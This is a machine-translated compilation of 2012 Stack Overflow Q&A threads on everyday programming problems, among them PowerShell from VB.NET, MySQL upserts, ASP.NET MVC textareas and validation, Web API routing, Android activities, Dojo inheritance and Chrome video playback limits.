# vb.net - 通过 .NET 代码加载 Powershell 模块

> ID：10658619
> 
> 赞同：1
> 
> 时间：2012-05-18T19:26:34.307
> 
> 标签：vb.net, powershell

我必须从 VB.NET 程序中调用 PS 命令。如果我正在调用标准 PS 命令，这可以正常工作，但如果我必须调用位于 3rd 方模块中的命令，我似乎无法使其工作。在 PS 控制台上，我可以键入`Import-Module MyModule`，然后我可以调用该模块中的命令。我尝试了以下但它不起作用，我仍然无法从模块内访问我的命令：

```
Dim PowerShell As Management.Automation.PowerShell = PowerShell.Create()
Dim PowerShellCommand As New PSCommand()
Dim PowerShellCommandResults As Object

PowerShellCommand.AddScript("Import-Module MyModule")
PowerShellCommand.AddScript("Get-MyCommand | Out-String")
PowerShell.Commands = PowerShellCommand
PowerShellCommandResults = PowerShell.Invoke() 
```

如何使用上面的代码示例执行此操作？除非必须，否则我不想将所有内容都更改为`Runspace`班级。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-20T00:58:52.283

简单的代码如下所示，它确实有效：

```
Dim command As New PSCommand()
command.AddScript("<Powershell command here>")
Dim powershell As Management.Automation.PowerShell = powershell.Create()
powershell.Commands = command
Dim results = powershell.Invoke() 
```

我在其他线程中解释了以下内容，您可以选择一个： [Powershell via VB.NET。哪种方法，为什么？](https://stackoverflow.com/questions/10617651/powershell-via-vb-net-which-method-and-why/10645646#10645646)

如果您提供有关错误信息的更多信息，我可能会提供帮助。

通过完整示例添加了更多信息：

我刚刚创建了一个非常简单的 C# DLL 并从 VB.NET 调用它，如下所示：

**C# DLL 代码：（将其视为第 3 方模块）**

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Xml.Linq;

namespace CSVtoXML
{
  public class Actions
  {
    public Actions()
    {

    }

    public static string writeHello(string name)
    {
        return "Hello " + name;

    }
 }
} 
```

如果您想**在 PS 命令窗口中测试此第 3 方 DLL，**只需使用以下命令：

```
PS C:\2012>  [Reflection.Assembly]::LoadFile("C:\2012\CSVtoXML.dll")

GAC    Version        Location
---    -------        --------
False  v2.0.50727     C:\2012\CSVtoXML.dll

PS C:\2012> [CSVtoXML.Actions]::writeHello("Avkash")
 Hello Avkash
PS C:\2012> 
```

现在我通过**在 VB.NET 应用程序中加载第 3 方模块**来使用相同的步骤，如下所示：

```
Module Module1
 Sub Main()
    Dim PowerShell As Management.Automation.PowerShell = PowerShell.Create()
    Dim PowerShellCommand As New PSCommand
    PowerShellCommand.AddScript("[Reflection.Assembly]::LoadFile('C:\2012\CSVtoXML.dll')")
    PowerShellCommand.AddScript("[CSVtoXML.Actions]::writeHello('Avkash')")
    PowerShell.Commands = PowerShellCommand
    Dim results = PowerShell.Invoke()
    MsgBox(results.Item(0).ToString())
 End Sub
End Module 
```

这是调试窗口中的输出，以证明代码确实按预期工作：

![在此处输入图像描述](../Images/3277d80f1290a87ebb3ca5cef4b48634.png)

# mysql - 如何对多个条目使用 ON DUPLICATE KEY？

> ID：10658623
> 
> 赞同：0
> 
> 时间：2012-05-18T19:26:46.557
> 
> 标签：mysql, insert, on-duplicate-key

在单个条目中，我们可以使用`ON DUPLICATE KEY`to`UPDATE`值：

```
INSERT INTO table
(title, number) VALUES ('$title', '$amount')
ON DUPLICATE KEY UPDATE number=number+$amount 
```

如何对多个条目使用`ON DUPLICATE KEY作为

```
INSERT INTO table
(title, number) VALUES 
('$title1', '$amount1'), 
('$title2', '$amount2'),
('$title3', '$amount3')
..... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:30:50.927

您可以使用 values 子句：

```
ON DUPLICATE KEY UPDATE 
   number = values(number),
   title = values(title) 
```

# css - 如何使用 CSS 设置文本区域的宽度和高度？

> ID：10658624
> 
> 赞同：23
> 
> 时间：2012-05-18T19:26:52.653
> 
> 标签：css, asp.net-mvc

这是我的CSS：

```
.editor-field textarea {
    width : 400;
    height : 100px;
} 
```

这是我认为的标记：

```
 <div class="editor-field">
            @Html.EditorFor(model => model.Visit.BehavioralObservations)
            @Html.ValidationMessageFor(model => model.Visit.BehavioralObservations)
        </div> 
```

这是我的模型的注释，显示了 MultilineText 属性：

```
 [DisplayName("Behavioral Observations")]
    [DataType(DataType.MultilineText)]
    public string BehavioralObservations { get; set; } 
```

为什么我不能设置这个文本区域的宽度？我可以在我的 CSS 中调整高度，它看起来是正确的（使用 Chrome 开发者工具验证），但宽度没有改变。Chrome 表示该宽度是一个无效的属性值，并且对该属性应用了删除线，并且在该属性旁边显示了一个黄色三角形。

仅供参考，这不仅限于 Chrome。IE8 也有同样的问题。

想法？我该如何解决？谢谢！

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-05-18T19:35:08.890

尝试使用`TextAreaFor`辅助方法并设置`cols`和`rows`html 属性

样本

```
@Html.TextAreaFor(model=>model.MyMultilineText, new {rows="6", cols="10"}) 
```

我希望这有帮助。问候。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-05-18T19:28:52.370

你离开了`px`：

```
.editor-field textarea {
    width : 400px;
    height : 100px;
} 
```

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2015-10-15T01:17:23.847

经过一段时间的搜索，最好的方法是使用**TextAreaFor()**方法的**重载之一**

 **```
@Html.TextAreaFor(model => model.Visit.BehavioralObservations, 10, 40, new { HtmlAttributes = new { } }) 
```

10是**行**数，40是**列数**

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2016-06-20T09:43:33.207

代码：

```
@Html.TextAreaFor(m => m.Message, 30, 10, new { @class = "what" }) 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2017-04-23T13:40:42.303

`ASP MVC`默认项目有`site.css`for `max-width:280`--`textarea`删除它并尝试这样的事情

```
@Html.TextAreaFor(model => model.ComicText, new { style = "width: 700px; height:150px;" }) 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-03-27T10:40:24.320

样式可以在链接中指定

@Html.TextAreaFor(model => model.values, new {style = "width: 700px; height:200px;"})**

# c# - SQL Server 使用 XML 在单个查询中执行批量更新

> ID：10658625
> 
> 赞同：1
> 
> 时间：2012-05-18T19:27:00.580
> 
> 标签：c#, xml, sql-server-2005

我一直在使用下面的示例代码片段来更新 SQL Server 2005 数据库表。它将具有一系列属性（字段）的自定义对象`List<T>`where转换`T`为嵌套在行根元素内的行元素上的 XML 属性。

通过这种方式，我在一个 SQL 事务中进行了大量的插入操作。遵循这条类似的路线，我想提供一系列 XML*更新*而不是插入。我无法找到任何好的资料来说明如何调整这种方法。例如，根据主键 A 说通过 F 更新 B。

```
conn.Open();
cmd = new SqlCommand();
cmd.Connection = conn;
cmd.CommandText = @"INSERT table (A,B,C,D,E,F) 
SELECT Tbl.Col.value('@A','nvarchar(50)'),
       Tbl.Col.value('@B','int'),
       Tbl.Col.value('@C','nvarchar(50)'),
       Tbl.Col.value('@D','nvarchar(1000)'),
       Tbl.Col.value('@E','nvarchar(50)'),
       Tbl.Col.value('@F','nvarchar(50)')
FROM @xml.nodes('//row') Tbl(Col)";
cmd.Parameters.Add("@xml", SqlDbType.Xml).Value = new XDocument(
new XDeclaration("1.0", "utf-8", "yes"),
new XElement("rows",
toInsert.Select(p => new XElement("row", new XAttribute("A", x.Prop1),
                     new XAttribute("B", x.Prop2),
                     new XAttribute("C", x.Prop3),
                     new XAttribute("D", x.Prop4),
                     new XAttribute("E", x.Prop5),
                     new XAttribute("F", x.Prop6))))).ToString();
Console.WriteLine(cmd.ExecuteNonQuery().ToString() + " row(s) affected.");
conn.Close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:55:00.347

如果您想坚持使用此方法，您可以使用以下 sql 修改插入并执行更新：

```
update  yourTable 
        set b = Tbl.Col.value('@B','int')
        --other cols...
from     yourTable y
join    @xml.nodes('//row') Tbl(Col) on
        y.a = Tbl.Col.value('@A','nvarchar(50)') 
```

# android - 创建一个死活动

> ID：10658626
> 
> 赞同：0
> 
> 时间：2012-05-18T19:27:01.060
> 
> 标签：android, android-activity

所以我创建了一个视图，它扩展了一个活动，即我的欢迎屏幕。

出于某种荒谬的原因，即使我使用覆盖第二个屏幕上的后退命令

```
@Override
public void onBackPressed() {
}

@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
     if (keyCode == KeyEvent.KEYCODE_BACK) {
     //preventing default implementation previous to android.os.Build.VERSION_CODES.ECLAIR
         return true;
     }
     return super.onKeyDown(keyCode, event);    
} 
```

覆盖成为我的主屏幕的第二个屏幕上的后退命令。我能够通过转到警报对话框返回到原始的 alpha 视图，并且非常快速地反复按下返回按钮，它必须注册并保存返回命令 5 次，然后返回到欢迎屏幕。

现在我的问题是如何确保我再也不能回到那个活动了。

该活动的目的是加载和欢迎屏幕。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:29:41.037

完成后调用`finish()`该活动，或者您可以在清单中设置该活动具有`noHistory="true"`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:30:30.593

我很难理解你写的大部分内容，但如果你只想显示一个`Activity`而不能返回它，在那个的清单中`Activity`，添加这一行：

```
android:noHistory="true" 
```

# c# - C# 中过滤后的 DataView 的最后一行

> ID：10658628
> 
> 赞同：0
> 
> 时间：2012-05-18T19:27:06.430
> 
> 标签：c#, dataview

我有一个 DataView，它被过滤为只包含我需要的那些记录。最重要的是，我想在 Dataview 中获得第一条记录。

```
 //appDV contains a bunch of records with different LOAN_STATUS. Here I'm filtering it by Approved

        appDV.RowFilter = "LOAN_STATUS = 'Approved'";
        appDV.Sort = "CREATE_TIME DESC";
        // If more than one record, take the 1st record
        appuser = new AppUserVO();
        appuser.APPUSER_ID = Convert.ToInt32(appDV.Table.Rows[0]["APPUSER_ID"].ToString());
        appuser.BankLenderId = appDV.Table.Rows[0]["BANK_LENDERID"].ToString().Trim();
        AppList.Add(appuser);

        return AppList; 
```

上面的代码没有返回正确的行......因为它在应用过滤器之前返回了 DataView 的行。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:40:04.597

我认为您不需要.Table。调用，而是应该使用

```
appDV.Rows[0]["APPUSER_ID"].ToString(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-19T04:28:20.257

设置排序表达式和行过滤器后，您必须调用 DataView.ToTable()

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-05T18:15:48.357

要从第一行获取列值：

```
string columnVal= appDV.ToTable().Rows[0]["COLUMN_NAME"].ToString(); 
```

您必须使用第`.ToTable()`一个将您在 DataView 中检索到的值转换为 DataTable。

# javascript - 将 CSS .class 作为参数传递给 javascript 函数

> ID：10658629
> 
> 赞同：2
> 
> 时间：2012-05-18T19:27:06.540
> 
> 标签：javascript, html, css

这里的目标是点击 1.gif，所有带有 .panel1 类的东西都会消失（style.display.none），所有带有 .panel2 类的东西都变得可见（style.display.inline）

我是新手……所以我认为这只是''或者“”的语法问题

```
<!DOCTYPE html>

<html>

<head>
    <title>main</title>
    <meta charset="utf-8">

    <style type="text/css">
    .panel1 {display:inline;}
    .panel2 {display:none;}
    </style>

    <script type="text/javascript">
    function panelTransition(panelOut,panelIn)
        {
        document.getElementByClass(panelIn).style.display="inline";
        document.getElementByClass(panelOut).style.display="none";
        }
    </script>
</head>

<body>
<img class="panel1" src=1.gif onclick="panelTransition(panel1,panel2)" />
<img class="panel2" src=2.gif />
</body>

</html> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:34:44.443

没有`getElementByClass`。它是`getElementsByClassName`，它返回一个项目数组，因此您需要修改代码以循环它们。

```
function panelTransition(panelOut, panelIn) {
    var inPanels = document.getElementsByClassName(panelIn);
    for (var i = 0; i < inPanels.length; i++) {
        inPanels[i].style.display = 'inline';
    }

    var outPanels = document.getElementsByClassName(panelOut);
    for (var i = 0; i < outPanels.length; i++) {
        outPanels[i].style.display = 'none';
    }
} 
```

If you were using a JavaScript library, like jQuery, this would be much easier to do. Also, as has been mentioned, you need quotes around your arguments to `panelTransition`.

```
<img class="panel1" src=1.gif onclick="panelTransition('panel1', 'panel2')" />
<img class="panel2" src=2.gif /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:30:10.083

```
<html>

<head>
    <title>main</title>
    <meta charset="utf-8">

    <style type="text/css">
    .panel1 {display:inline;}
    .panel2 {display:none;}
    </style>

    <script type="text/javascript">
    function panelTransition(panelOut,panelIn)
                {
                    // panelIn gets turned on
                    setDisplay(panelIn,"inline");

                    // panelOut gets turned off
                    setDisplay(panelOut,"none");
                }

                function setDisplay(className,displayState)
                {
                    // retrieve a list of all the matching elements
                    var list = document.getElementsByClassName(className);

                    // step through the list
                    for(i=0; i<list.length; i++) {
                        // for each element, set the display property
                        list[i].style.display = displayState;
                    }                        
                }
    </script>
</head>

<body>
<img class="panel1" src="1.gif" onclick="panelTransition('panel1','panel2')" />
<img class="panel2" src="2.gif" onclick="panelTransition('panel2','panel1')" />
</body>

</html> 
```

或者您可以在 jQuery 中完成相同的操作

```
// fires when the page is up and running
$(document).ready(function(){

     // find all the panel1 elements, 
     // attach an on click handler
     $(".panel1").bind("click", function(){ 

            // find all the panel1 elements
            // set their css display property to inline
            $(".panel1").css("display","inline"); 

            // find all the panel2 elements
            // set their css display property to none
            $(".panel2").css("display","none");
     });

     $(".panel2").bind("click", function(){ 
            $(".panel2").css("display","inline"); 
            $(".panel1").css("display","none");
     });
}); 
```

您可以在这里了解有关 jQuery 的所有信息：[http ://www.jquery.com/](http://www.jquery.com/)

您只能让您的代码运行一次，一旦您单击 panel1 图像，所有 panel2 图像都会消失，您将无法再次单击它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:30:48.743

```
<img class="panel1" src=1.gif onclick="panelTransition('panel1','panel2')" /> 
```

我认为你需要那里的报价

# java - Ant 新手，JUnit 中的 ClassNotFoundException

> ID：10658636
> 
> 赞同：7
> 
> 时间：2012-05-18T19:27:26.770
> 
> 标签：java, ant, junit

我已经为此苦恼了一段时间（谷歌搜索了一堆，查看了其他相关的 SO 帖子无济于事）。我有一个由两个文件组成的 Java 程序，`Logic`并且`Tests`. `Tests`包含大约一百个 JUnit 测试，通过调用`javac *.java`后跟`java org.junit.runner.JUnitCore Tests`. 然而，当我`build.xml`用一个简单的方法运行我的`ant -verbose test`（为了跟踪输出，因为我对这一切都不熟悉），我得到以下输出：

```
[junit] Testsuite: Tests
[junit] Tests run: 1, Failures: 0, Errors: 1, Time elapsed: 0 sec
[junit] 
[junit] Null Test:  Caused an ERROR
[junit] Tests
[junit] java.lang.ClassNotFoundException: Tests
[junit]     at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
[junit]     at java.lang.Class.forName0(Native Method)
[junit]     at java.lang.Class.forName(Class.java:247)
[junit] 
[junit] 
[junit] Test Tests FAILED

BUILD SUCCESSFUL 
```

我`build.xml`的如下：

```
<project name="ETL_Automation" default="test" basedir=".">

<path id="classpath.base">
</path>

<path id="classpath.test">
  <pathelement location="${basedir}/mysql-connector-java-5.1.18-bin.jar" />
  <pathelement location="${basedir}/junit-4.10.jar"/>
  <path refid="classpath.base" />
</path>

<target name="compile">
  <javac srcdir="${basedir}">
    <classpath refid="classpath.test"/>
  </javac>
</target>

<target name="test" depends="compile">
  <junit fork="no">
    <classpath refid="classpath.test" />
    <formatter type="brief" usefile="false" />
    <batchtest>
      <fileset dir="${basedir}/" includes="Tests.class" />
    </batchtest>
  </junit>
</target>

<target name="clean" depends="test">
  <delete>
    <fileset dir="${basedir}" includes="*.class"/>
  </delete>
</target> 
```

目录结构非常简单。`Tests.java`, `Logic.java`, `junit-4.10.jar`, `mysql-connector-java-5.1.18-bin.jar`,`build.xml`和引用的`.properties`文件都在同一个文件夹中。Java 代码引用了外部文件，但这些文件与此特定问题无关。我不知道类路径是否可能是导致此问题的原因（因为我非常确信我目前拥有的东西不起作用）。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:34:11.583

您需要将带有 的目录添加`Tests.class`到`classpath.tests`类路径（`${basedir}`在您的设置中）

尝试：

```
<path id="classpath.test"> 
  <pathelement location="${basedir}/mysql-connector-java-5.1.18-bin.jar" /> 
  <pathelement location="${basedir}/junit-4.10.jar"/> 
  <pathelement location="${basedir}" /> 
  <path refid="classpath.base" /> 
</path> 
```

# c# - 使用自定义 ui xml 将按钮添加到 Outlook 消息选项卡

> ID：10658639
> 
> 赞同：0
> 
> 时间：2012-05-18T19:28:00.210
> 
> 标签：c#, asp.net, xml

我可以将按钮添加到文件菜单后台视图，但我也想将它添加到消息选项卡或在工具栏的下一行显示我的自定义按钮。这是可能的，还是有更好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T22:29:17.333

这是 xml 代码，它对我有用。希望能帮助到你。

```
<?xml version="1.0" encoding="UTF-8"?>
<customUI xmlns="http://schemas.microsoft.com/office/2009/07/customui" onLoad="Ribbon_Load">
  <ribbon>
    <tabs>
      <tab idMso="TabReadMessage">
        <group id="GroupNew" label="My Group" insertBeforeMso="GroupClipboard">
          <button id="buttonid" size="large" label="my button" onAction="mybutton_click" imageMso="HappyFace"/>
        </group>
      </tab>
    </tabs>
  </ribbon>
</customUI> 
```

# c# - ASP.NET Web.api 如何处理名称以 GET 开头的两个方法？

> ID：10658640
> 
> 赞同：8
> 
> 时间：2012-05-18T19:28:02.283
> 
> 标签：c#, asp.net, asp.net-mvc-4, asp.net-web-api

我正在查看 Microsoft 的以下教程。根据本教程，

> 在第一个示例中，“products”匹配名为 ProductsController 的控制器。该请求是一个 GET 请求，因此框架会在 ProductsController 上查找名称以“Get...”开头的方法。此外，URI 不包含可选的 {id} 段，因此框架会寻找不带参数的方法。ProductsController::GetAllProducts 方法满足所有这些要求。

如果有两种方法，如 GetAllProducts() 和 GetSoldProducts()，会发生什么？两者都没有参数。

[您的第一个 Web API 教程](http://www.asp.net/web-api/overview/getting-started-with-aspnet-web-api/tutorial-your-first-web-api)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-21T20:54:59.237

对于这个特定问题，有两种可能的解决方案：

1.  更改 MapHttpRoute 调用以要求指定操作的名称。（我使用自托管语法）：

    ```
     config.Routes.MapHttpRoute(
                "API Route 1",
                "api/{controller}/{action}");

        config.Routes.MapHttpRoute(
                "API Route 2",
                "api/{action}",
                new { controller = "products" }); 
    ```

    所以你的http客户端会调用：

    `api/products/GetAllProducts`或`api/GetAllProducts` `api/products/GetSoldProducts`或`api/GetSoldProducts`

    见： [http ://www.asp.net/web-api/overview/web-api-routing-and-actions/routing-in-aspnet-web-api](http://www.asp.net/web-api/overview/web-api-routing-and-actions/routing-in-aspnet-web-api)

2.  将每个方法放在一个单独的控制器（ProductsController、SoldProductsController）中。所以你会打电话`api/products`并`api/soldproducts`得到你的结果。

* * *

相关主题... 在您有多个 Get 操作且具有相同类型的单个原始参数的情况下，ASP.NET Web API 将查看参数的名称以解析要调用的重载操作。

例如，如果您有两个操作：

```
GetProductByName(string name) 
GetProductByCategory(string category) 
```

您的 http 客户端可以调用

```
api/products?name=hammer 
api/products?category=toys 
```

并且路由引擎将调用正确的操作。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-18T19:35:55.187

假设您使用的是默认路由，简短的回答是：将调用您的类的第一个（在顶部）定义的方法。另一种方法是无法访问的。

> 注意：测试版在“匹配多种方法”方面的表现与上述相同——RC 和发布版本有点强迫症。如果有多个潜在匹配项，则会引发错误。此更改消除了多个不明确匹配的混淆。同时，它降低了我们在同一个控制器中混合 REST 和 RPC 样式接口的能力，依赖于顺序和重叠的路由。

[从我写的关于该主题](https://stackoverflow.com/questions/10439738/how-does-a-method-in-mvc-webapi-map-to-an-http-verb/10471854#10471854)的另一篇文章中大量窃取：

**WebAPI 匹配语义**

WebAPI 使用的匹配语义相当简单。

1.  它将动作的名称与动词匹配（动词 = get？查找以“get”开头的方法）
2.  如果传递了参数，则 api 会寻找带有参数的操作

因此，在您的代码示例中，不带参数的 GET 请求与不带参数的`Get*( )`函数匹配。包含和 ID 的 Get 查找`Get***(int id)`.

**例子**

虽然匹配语义很简单，但它给 MVC 开发人员（至少这个开发人员）造成了一些混乱。让我们看一些例子：

*奇数名称*- 您的 get 方法可以命名为任何名称，只要它以“get”开头。因此，在小部件控制器的情况下，您可以命名您的功能`GetStrawberry()`，它仍然会匹配。将匹配想象为： `methodname.StartsWith("Get")`

*多种匹配方法*- 如果您有两个没有参数的 Get 方法会发生什么？ `GetStrawberry()`和`GetOrange()`。据我所知，代码中首先定义的函数（文件顶部）胜出……奇怪。这具有使控制器中的某些方法无法访问的副作用（至少使用默认路由）......陌生人。

**更新**

@WinFXGuy - 发表评论有点长，但是......

不要妄下结论！我试图回答你提出的问题，但这只是故事的一半。您可以做很多事情来更改默认行为。

**首先**，WebAPI 支持大部分[oData](http://www.odata.org/)规范。如果您冒泡`IQueryable`到您的控制器，oData 参数将自动与查询对象集成。它采用`$filter`,`$top`和等参数`$skip`。因此，在您的情况下，您可以编写一种方法并传递类似`$filter=sale_date neq null`.

此外，您可以应用该`[ResultLimit]`属性来防止人们要求 150 亿条记录。

**其次**，您可以修改路线。默认路由针对的是 RESTful api，通常每个实体有 1 个控制器。您可以更改路由并使其成为 RPC 样式。

如果您查看我的链接帖子，我将解释我如何保留默认路由绑定、添加“子文件夹”以及在我需要的情况下允许额外的方法调用`GetAllProducts()`和`GetSoldProducts()`.

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-05-12T17:27:02.963

添加答案以反映最新版本的 Web API 原生支持`[Route]`属性

```
[Route("api/products")]
public IEnumerable<Product> GetAllProducts(){}

[Route("api/products/sold")]
public IEnumerable<Product> GetSoldProducts(){} 
```

# jquery - 启用客户端验证不起作用

> ID：10658649
> 
> 赞同：0
> 
> 时间：2012-05-18T19:28:45.047
> 
> 标签：jquery, ajax, asp.net-mvc, validation

这是我在母版页中的脚本部分：

```
<script src="../../Scripts/jquery-1.7.1.min.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.ui.datepicker.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.ui.core.min.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.ui.widget.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.validate.min.js" type="text/javascript"></script>

<script src="../../Scripts/Validation/MicrosoftMvcAjax.js" type="text/javascript"></script>
<script src="../../Scripts/Validation/MicrosoftMvcValidation.js" type="text/javascript"></script> 
```

这就是我的表单的样子：

```
 <% Html.EnableClientValidation(); %>
                <% using (Html.BeginForm("Inscription", "Home", FormMethod.Post, new { @class = "search_form", enctype = "multipart/form-data"}))
       { %>
        <%: Html.ValidationSummary(true) %>
            <div class="editor-label">
           <p>
            <%: Html.LabelFor(model => model.Mailag) %>
            </p>
        </div>
        <div class="editor-field">
        <p>
            <%: Html.EditorFor(model => model.Mailag, new { @class = "text longfield" })%>
            <%: Html.ValidationMessageFor(model => model.Mailag) %>
            </p>
// the reste of code is similaire to the first editor label :
        </div>
    <% } %> 
```

我已经按照博客中的相同说明来激活客户端，但不幸的是它对我没有用:(我想我在这里遗漏了一些东西？服务器验证工作得很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-19T12:06:00.843

我已删除所有`Microsoft*.js`内容并用以下内容替换它们：

```
<script src="../../Scripts/jquery.validate.min.js" type="text/javascript"></script>
<script src="../../Scripts/jquery.validate.unobtrusive.min.js" type="text/javascript"></script> 
```

一切都很好:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:47:42.050

我认为您可以尝试以下方法来验证代码可能不适合您的原因。

1）请转到您的**浏览器**并查看`source of the HTML`并确保您尝试包含的脚本文件存在于那里。

2）此外，如果您在 Mozilla 上进行测试，您可以**检查**代码，该代码`firebug`可以作为扩展安装以查看出现了什么问题。

希望能帮助到你

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-19T10:18:58.030

我看不出您的代码有太多错误，但是您似乎缺少对 **MicrosoftAjax.js**的引用。尝试包括它：

另外，你的控制器是什么样的？您是否在检查**modelState**是否有效？

```
[HttpPost]
public ActionResult Create(Course course)
{
  try
  {
    if (ModelState.IsValid)
    {
      _courses.Add(course);
      return RedirectToAction("Index");
    }
    return View();
  }
  catch
  {
    return View();
  }
} 
```

如果您不检查，视图将不会知道验证失败。第三，你有没有用正确的属性装饰你的班级？例如：

```
public class Course
{
  [Required(ErrorMessage = "Course title is required")]
  public string Title { get; set; }

  [StringLength(5, ErrorMessage = "Course can have up to 5 days")]
  public string Days { get; set; }    

} 
```

# javascript - 在 dojo 中使用 this 通过父类访问子方法

> ID：10658652
> 
> 赞同：4
> 
> 时间：2012-05-18T19:29:07.423
> 
> 标签：javascript, dojo

给定类 A 和类 B，其中类 B 继承自类 A ...

```
// Define class A
dojo.declare("mynamespace.A",null,{
    myMethodA: function() { this.myMethodB() }
});

// Define class B
dojo.declare("mynamespace.B",mynamespace.A,{
    myMethodB: function() {}
}); 
```

在 A 类（父类）范围内调用 this.myMethodB() 是否合法？我在一个软件中看到过这个，我不明白。我知道在 Java 中，除非您将 A 类型转换为 B，否则这是不可能的。但是 dojo 有什么不同吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T21:17:35.980

JavaScript 中没有静态编译，因此，正如@akonsu 所提到的，它在技术上是可行的，但它不是一个可以遵循的模式：

```
var a = new mynamespace.A();
a.myMethodA(); // ilegal: Uncaught TypeError: Object [object Object] has no method 'methodB' 

var b = new mynamespace.B();
b.myMethodA() // legal 
```

您还可以在 JavaScript 的给定范围内执行方法/函数，即作为给定对象的方法：

```
a.myMethodA.call(b); // legal as `this` inside `myMethodA` will be referencing to object `b` 
```

实际上，我认为可以用你从 Java 中知道`mynamespace.A`的抽象方法来模拟抽象类。`myMethodB`类`mynamespace.A`当子类化时，子类应该实现`myMethodB`. 但是这样做很容易出错，我会以更健壮的方式来做：

```
// Define class A
dojo.declare("mynamespaca.A", null, {

    myMethodA: function() {
        this.myMethodB();
    },

    myMethodB: function() {
        // abstract method
        console.warn("Abstract method [myMethodB] was not implemented.");
        // or: throw new Error("Abstract method [myMethodB] was not implemented.");
    }   

});

// Define class B
dojo.declare("mynamespace.B", mynamespace.A, {

    myMethodB: function() {
        // implement abstract method here
    }

}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-19T11:08:58.570

这个问题的流行语是**this.inherited(arguments);** 你的问题是调用一个不在当前继承范围内的方法 - 并且一个真正的面向对象的程序员会被称为无效..但是它是可能的（仍然）因为加载器声明了全局范围内的所有内容，例如你可以访问任何模块通过*mynamespace.X 然后添加原型.theMethod。*

一旦你像在 mynamespace.B 中一样拥有继承，A 和 B 的所有功能都是“this”范围的。它就像是东西的合并散列，比如说`for all methods and variables in A do set instance B[key] = property A[key]`。

但是，如果您遇到覆盖，其中属性为“类”A 和 B 的原型 - 声明/构造链中有一种机制允许调用“超级”（或父类，遵循您的符号）。

对于特殊属性构造函数来说，继承冒泡[期间]总是如此。

对于仅声明一次的任何方法，如果它不是继承的方法，您就不能自己调用​​它 - 然后可以通过“this”访问它

对于任何具有覆盖的方法，函数 'this.inherited(arguments);' 将向您向上发送一个刻度线到当前的被调用者父类。看看[这里的扩展小提琴](http://jsfiddle.net/seeds/FW8CW/1/)

```
var AClass = dojo.declare("mynamespace.A", null, {
    constructor: function(args) {
        this.overriddenMethod();
    },
    overriddenMethod: function() {

    }
});
var BClass = dojo.declare("mynamespace.B", [AClass], {

    constructor: function() {  },

    overriddenMethod: function() {
        // call super before anything else is processed in this method
        // by placing following call you can control function callflow
        this.inherited(arguments);
    }
});

// will call A.constructor, then A.overriddenMethod
new AClass();

// will call B.constructor, A.constructor, B.overriddenMethod and then
//  A.overriddenMethod via the call to super
//  in B.overriddenMethod which A.constructor 
//  calls (note that A.constructor callflow 'aims' B.override not A.override)
new BClass(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T20:46:34.133

您可以使用原型对象调用任何方法。

```
myMethodA: function() { mynamespace.B.prototype.myMethodB(); } 
```

这是一个工作示例：

[http://jsfiddle.net/cswing/7cBJm/](http://jsfiddle.net/cswing/7cBJm/)

# html - 如果打开的选项卡过多，Chrome HTML5 视频将停止工作 - 内存问题？

> ID：10658654
> 
> 赞同：7
> 
> 时间：2012-05-18T19:29:10.147
> 
> 标签：html, memory, video

我正在使用 jQuery 动态编写`<video>`对象，并运行 videojs 来初始化它们。播放视频后，有时当我尝试再次播放时，它就无法播放，从那时起，即使刷新页面后，也不会播放任何视频。每次，`<video>`对象都会渲染，但视频不会播放。没有任何内容写入控制台。似乎没有任何错误。重新启动 Chrome 可以解决问题，但只是暂时的。播放了几个视频后，问题又回来了。

我发现关闭 Chrome 中的其他选项卡确实可以解决问题，所以它似乎是某种内存问题。

我正在运行 Chrome 19.0.1084.46

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-20T07:57:59.013

你到底有多少个`video`标签？他们看起来怎么样？它们包括[`preload='none'`](http://www.w3schools.com/html5/att_video_preload.asp)属性吗？源视频都在服务器上吗？

我问是因为如果您在一个页面上有超过六个`video`标签指向同一个源服务器，那么您可能会遇到“连接饥饿”：

*   Chrome 只允许六个打开的连接到单个服务器（基于 URL 中的 DNS 名称）
*   html5`video`标签的 preload 属性默认值为`'auto'`
*   Chrome 的自动行为是预加载一些数据并保持连接打开，以便为视频提取更多数据

因此，如果单个页面上超过六个视频标签指向单个服务器，则视频将无法播放。要解决此特定问题，请将`preload`属性设置为`'none'`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-15T12:42:06.567

